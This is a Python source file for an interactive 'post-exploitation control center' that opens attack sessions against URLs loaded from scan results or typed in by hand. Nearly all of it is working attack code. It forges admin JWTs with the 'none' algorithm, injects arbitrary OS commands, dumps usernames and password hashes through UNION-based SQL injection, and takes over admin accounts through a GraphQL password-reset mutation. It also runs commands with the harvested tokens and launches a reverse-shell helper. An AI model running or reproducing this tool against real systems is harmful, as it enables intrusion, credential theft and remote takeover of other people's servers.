import os
import sys
import json
import urllib.request
import urllib.parse
import urllib.error
import base64

RESULTS_FILE = "scan_results.json"

def load_findings():
    if not os.path.exists(RESULTS_FILE):
        return []
    with open(RESULTS_FILE, "r") as f:
        try:
            return json.load(f)
        except Exception:
            return []

def run_target_shell(target_url, vuln_type, token=None, param=None):
    print("=" * 65)
    print(f" [*] INTERACTIVE SESSION [{vuln_type.upper()}]")
    print(f" [*] Target: {target_url}")
    print("=" * 65)
    print(" Type 'help' for available commands, or 'exit' to return to dashboard.")
    
    harvested_token = token
    harvested_endpoint = None
    
    while True:
        try:
            cmd = input("(target session)> ").strip()
        except (KeyboardInterrupt, EOFError):
            break

        if cmd == "exit" or cmd == "quit":
            break
        elif cmd == "help":
            print("    Commands:")
            print("      info        - View current target and vulnerability details")
            print("      exploit     - Re-run automated exploit/audit payload against target")
            if vuln_type in ["SQLi", "SQL Injection"]:
                print("      tables      - Enumerate database tables via UNION injection")
                print("      dump        - Extract user records and password hashes")
                print("      query <sql> - Send custom SQL injection string")
                print("      escalate    - Authenticate using dumped admin credentials to harvest token")
                print("      exec <cmd>  - Execute OS commands using the harvested admin token")
            elif vuln_type == "Command Injection":
                print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
                print("      revshell    - Generate reverse shell payloads for this target")
            elif vuln_type == "GraphQL":
                print("      users       - Quick query to fetch all users & credit cards")
                print("      secret      - Quick query to fetch secret admin data & flags")
                print("      escalate    - Execute privilege escalation mutation (Admin Takeover)")
                print("      exec <cmd>  - Execute OS command using auto-matched admin endpoint & token")
                print("      revshell    - Trigger reverse shell payload via admin endpoint")
                print("      query <q>   - Send any custom GraphQL query string")
            print("      curl        - Send a custom test request to the target")
            print("      exit        - Return to the main dashboard")
        elif cmd == "info":
            print(f"    Target URL    : {target_url}")
            print(f"    Vector Type   : {vuln_type}")
            print(f"    Parameter     : {param or 'N/A'}")
            print(f"    Token         : {harvested_token[:30] + '...' if harvested_token else 'N/A'}")
            print(f"    Admin Endpoint: {harvested_endpoint or 'N/A (Run escalate)'}")
        elif cmd == "exploit":
            if vuln_type == "JWT" and harvested_token:
                print("[*] Re-running Forged Admin JWT Bypass...")
                try:
                    parts = harvested_token.split('.')
                    padding = '=' * (4 - len(parts[1]) % 4)
                    payload = json.loads(base64.urlsafe_b64decode(parts[1] + padding).decode('utf-8'))
                    payload["role"] = "admin"
                    payload["sub"] = 1
                    
                    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4)).decode('utf-8'))
                    header["alg"] = "none"
                    
                    def enc(d):
                        return base64.urlsafe_b64encode(json.dumps(d, separators=(',', ':')).encode('utf-8')).decode('utf-8').rstrip('=')
                    
                    forged_token = f"{enc(header)}.{enc(payload)}."
                    
                    req = urllib.request.Request(target_url, headers={
                        'User-Agent': 'Mozilla/5.0',
                        'Authorization': f'Bearer {forged_token}'
                    })
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        body = resp.read().decode('utf-8', errors='ignore')
                        print(f"    [!] SUCCESS! Response (HTTP {resp.getcode()}):\n        {body}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type == "Command Injection":
                print("[*] Firing Command Injection test payload (;id)...")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    q = urllib.parse.parse_qs(parsed.query)
                    base_val = q.get(param, ["127.0.0.1"])[0]
                    q[param] = [base_val + ";id"]
                    new_q = urllib.parse.urlencode(q, doseq=True)
                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                    
                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type in ["SQLi", "SQL Injection"]:
                print("[*] Firing SQL Syntax error test payload (')...")
                try:
                    parsed = urllib.parse.urlparse(target_url)
                    q = urllib.parse.parse_qs(parsed.query)
                    param_name = param or "cat"
                    q[param_name] = ["1'"]
                    new_q = urllib.parse.urlencode(q, doseq=True)
                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                    
                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] Exploit failed: {e}")
            elif vuln_type == "GraphQL":
                print("[*] Re-running GraphQL Introspection query...")
                try:
                    query_payload = {"query": "{ __schema { types { name fields { name } } } }"}
                    data = json.dumps(query_payload).encode('utf-8')
                    req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                except Exception as e:
                    print(f"    [-] GraphQL audit failed: {e}")
            else:
                print(f"[*] Executing generic test against {target_url}...")
                try:
                    req = urllib.request.Request(target_url, headers={'User-Agent': 'Mozilla/5.0'})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        print(f"    [+] Response HTTP {resp.getcode()}:\n{resp.read().decode('utf-8', errors='ignore')[:300]}")
                except Exception as e:
                    print(f"    [-] Request failed: {e}")
        elif cmd.startswith("exec ") and vuln_type == "Command Injection":
            user_linux_cmd = cmd.split(" ", 1)[1]
            print(f"[*] Executing command against target: {user_linux_cmd}")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                base_val = q.get(param, ["127.0.0.1"])[0]
                q[param] = [f"{base_val};{user_linux_cmd}"]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Execution failed: {e}")
        elif cmd == "tables" and vuln_type in ["SQLi", "SQL Injection"]:
            print("[*] Enumerating database tables via UNION-based injection...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                param_name = param or "cat"
                q[param_name] = ["1' UNION SELECT 1,table_name FROM information_schema.tables--"]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Enumeration failed: {e}")
        elif cmd == "dump" and vuln_type in ["SQLi", "SQL Injection"]:
            print("[*] Dumping user records and password hashes via SQL injection...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                param_name = param or "cat"
                q[param_name] = ["1' UNION SELECT 1,username,password_hash FROM users--"]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Dump failed: {e}")
        elif cmd.startswith("query ") and vuln_type in ["SQLi", "SQL Injection"]:
            sql_payload = cmd.split(" ", 1)[1]
            print(f"[*] Injecting custom SQL payload: {sql_payload}")
            try:
                parsed = urllib.parse.urlparse(target_url)
                q = urllib.parse.parse_qs(parsed.query)
                param_name = param or "cat"
                q[param_name] = [sql_payload]
                new_q = urllib.parse.urlencode(q, doseq=True)
                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                
                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "escalate" and vuln_type in ["SQLi", "SQL Injection"]:
            print("[*] Authenticating with harvested admin credentials (admin:password)...")
            try:
                parsed = urllib.parse.urlparse(target_url)
                base_domain = f"{parsed.scheme}://{parsed.netloc}"
                auth_url = f"{base_domain}/api/v1/admin/login?user=admin&pass=password"
                
                req = urllib.request.Request(auth_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        res_json = json.loads(resp_body)
                        harvested_token = res_json.get("adminToken")
                        harvested_endpoint = res_json.get("adminEndpoint")
                        print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
                        print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
            except Exception as e:
                print(f"    [-] Escalation failed: {e}")
        elif cmd.startswith("exec ") and vuln_type in ["SQLi", "SQL Injection"]:
            user_linux_cmd = cmd.split(" ", 1)[1]
            if not harvested_token:
                print("    [-] No admin token available. Run 'escalate' first using dumped credentials.")
                continue
            
            target_exec_url = harvested_endpoint or "http://127.0.0.1:8080/api/v1/admin/exec"
            print(f"[*] Pivoting admin token against endpoint: {target_exec_url}")
            try:
                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
                req = urllib.request.Request(exec_url, headers={
                    'User-Agent': 'Mozilla/5.0',
                    'Authorization': f'Bearer {harvested_token}'
                })
                with urllib.request.urlopen(req, timeout=3) as resp:
                    raw_body = resp.read().decode('utf-8', errors='ignore')
                    try:
                        res_json = json.loads(raw_body)
                        if "output" in res_json:
                            print(f"\n{res_json['output']}\n")
                        else:
                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
                    except Exception:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
            except Exception as e:
                print(f"    [-] Execution failed: {e}")
        elif cmd == "users" and vuln_type == "GraphQL":
            print("[*] Querying GraphQL API for user records...")
            try:
                payload = {"query": "{ users { id username email creditCard } }"}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "secret" and vuln_type == "GraphQL":
            print("[*] Querying GraphQL API for secret admin data...")
            try:
                payload = {"query": "{ secretAdminData }"}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "escalate" and vuln_type == "GraphQL":
            print("[*] Launching GraphQL Privilege Escalation (Admin Takeover Mutation)...")
            try:
                mutation_payload = {
                    "query": "mutation { updatePassword(userId: 101, newPassword: \"NewAdminP@ss123\") { status message adminToken adminEndpoint } }"
                }
                data = json.dumps(mutation_payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    resp_body = resp.read().decode('utf-8', errors='ignore')
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp_body}")
                    if "adminToken" in resp_body:
                        try:
                            res_json = json.loads(resp_body)
                            mutation_data = res_json["data"]["updatePassword"]
                            harvested_token = mutation_data.get("adminToken")
                            harvested_endpoint = mutation_data.get("adminEndpoint")
                            print(f"    [!] SUCCESS! Admin Token Harvested: {harvested_token[:30]}...")
                            if harvested_endpoint:
                                print(f"    [!] Auto-Matched Admin Endpoint: {harvested_endpoint}")
                        except Exception:
                            harvested_token = "admin_token_sig"
                    print("    [!] Administrative takeover achieved via GraphQL mutation.")
            except Exception as e:
                print(f"    [-] Privilege escalation failed: {e}")
        elif cmd.startswith("exec ") and vuln_type == "GraphQL":
            user_linux_cmd = cmd.split(" ", 1)[1]
            if not harvested_token:
                print("    [-] No admin token available. Run 'escalate' first to obtain authorization.")
                continue
            
            target_exec_url = harvested_endpoint
            if not target_exec_url:
                base_domain = target_url.rsplit('/', 1)[0]
                target_exec_url = f"{base_domain}/api/v1/admin/exec"

            print(f"[*] Pivoting admin token against auto-matched endpoint: {target_exec_url}")
            try:
                exec_url = f"{target_exec_url}?cmd={urllib.parse.quote(user_linux_cmd)}"
                req = urllib.request.Request(exec_url, headers={
                    'User-Agent': 'Mozilla/5.0',
                    'Authorization': f'Bearer {harvested_token}'
                })
                with urllib.request.urlopen(req, timeout=3) as resp:
                    raw_body = resp.read().decode('utf-8', errors='ignore')
                    try:
                        res_json = json.loads(raw_body)
                        if "output" in res_json:
                            print(f"\n{res_json['output']}\n")
                        else:
                            print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
                    except Exception:
                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{raw_body}")
            except Exception as e:
                print(f"    [-] Execution failed: {e}")
        elif cmd.startswith("query ") and vuln_type == "GraphQL":
            gql_query = cmd.split(" ", 1)[1]
            print(f"[*] Sending custom GraphQL query: {gql_query}")
            try:
                payload = {"query": gql_query}
                data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(target_url, data=data, headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}, method='POST')
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Query failed: {e}")
        elif cmd == "revshell" and (vuln_type == "Command Injection" or vuln_type == "GraphQL"):
            print("[*] Generating active reverse shell payloads (LHOST: 127.0.0.1, LPORT: 4444)...")
            if os.path.exists("rev_shell.py"):
                os.system("python rev_shell.py --ip 127.0.0.1 --port 4444")
            else:
                print("    [-] rev_shell.py not found.")
        elif cmd.startswith("curl "):
            custom_url = cmd.split(" ", 1)[1]
            try:
                req = urllib.request.Request(custom_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as resp:
                    print(f"    [+] HTTP {resp.getcode()}:\n{resp.read().decode('utf-8', errors='ignore')}")
            except Exception as e:
                print(f"    [-] Error: {e}")
        else:
            print(f"    [-] Unknown command '{cmd}'. Type 'help' for options.")

def main_console():
    findings = load_findings()
    if not findings:
        print("[-] No scan results found. Run the autonomous pipeline (Option 1) first.")
        input("\nPress Enter to return...")
        return

    while True:
        print("\n" + "=" * 65)
        print(" [*] ACCESS GAINED & POST-EXPLOITATION CONTROL CENTER")
        print("=" * 65)
        print(f" [+] Loaded {len(findings)} harvested vector(s).\n")
        print(" [Harvested Assets & Interactive Shells]")
        print("  1) JWT Tokens & Privilege Escalation Targets")
        print("  2) IDOR / BOLA Endpoints")
        print("  3) SQLi, LFI & Command Injection Vectors")
        print("  4) Modern API & GraphQL Endpoints")
        print("  5) Open Custom Manual Target Session")
        print("  6) Return to Main Menu")
        print("-" * 65)
        
        choice = input("Select action [1-6]: ").strip()

        if choice == "1":
            jwt_items = [f for f in findings if f.get("vulnerability") == "JWT"]
            if not jwt_items:
                print("[-] No JWT tokens found.")
                continue
            print("\n[★] JWT Assets:")
            for idx, item in enumerate(jwt_items, 1):
                print(f"    {idx}) {item.get('target')}")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(jwt_items):
                item = jwt_items[int(sel) - 1]
                run_target_shell(item.get("target"), "JWT", token=item.get("token"))

        elif choice == "2":
            idor_items = [f for f in findings if f.get("vulnerability") == "IDOR"]
            if not idor_items:
                print("[-] No IDOR endpoints found.")
                continue
            print("\n[★] IDOR Endpoints:")
            for idx, item in enumerate(idor_items, 1):
                print(f"    {idx}) {item.get('target')} (Param: {item.get('param')})")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(idor_items):
                item = idor_items[int(sel) - 1]
                run_target_shell(item.get("target"), "IDOR", param=item.get("param"))

        elif choice == "3":
            other_items = [f for f in findings if f.get("vulnerability") in ["SQLi", "SQL Injection", "LFI", "Command Injection"]]
            if not other_items:
                print("[-] No SQLi, LFI, or Command Injection vectors found.")
                continue
            print("\n[★] SQLi, LFI & Command Injection Vectors:")
            for idx, item in enumerate(other_items, 1):
                print(f"    {idx}) [{item.get('vulnerability')}] {item.get('target')} (Param: {item.get('param', 'N/A')})")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(other_items):
                item = other_items[int(sel) - 1]
                run_target_shell(item.get("target"), item.get("vulnerability"), param=item.get("param"))

        elif choice == "4":
            gql_items = [f for f in findings if "GraphQL" in f.get("vulnerability", "")]
            if not gql_items:
                print("[-] No GraphQL endpoints found.")
                continue
            print("\n[★] Modern API & GraphQL Endpoints:")
            for idx, item in enumerate(gql_items, 1):
                print(f"    {idx}) {item.get('target')} - {item.get('vulnerability')}")
            sel = input("\nSelect index to open interactive shell (or Enter to go back): ").strip()
            if sel.isdigit() and 1 <= int(sel) <= len(gql_items):
                item = gql_items[int(sel) - 1]
                run_target_shell(item.get("target"), "GraphQL")

        elif choice == "5":
            url = input("Enter custom target URL: ").strip()
            run_target_shell(url, "Manual")

        elif choice == "6":
            break
        else:
            print("[-] Invalid selection.")

if __name__ == "__main__":
    main_console()
